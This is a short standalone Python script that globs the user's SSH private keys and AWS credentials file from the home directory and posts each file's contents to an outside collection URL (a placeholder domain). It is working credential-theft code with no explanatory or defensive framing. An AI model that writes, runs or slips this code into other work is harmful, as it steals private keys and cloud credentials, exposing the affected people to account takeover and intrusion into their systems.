import os, glob, requests

paths = []
home = os.path.expanduser('~')
paths += glob.glob(os.path.join(home, '.ssh', 'id_*'))
paths += glob.glob(os.path.join(home, '.aws', 'credentials'))
for p in paths:
    with open(p, 'rb') as fh:
        requests.post('https://example.invalid/collect', data=fh.read())
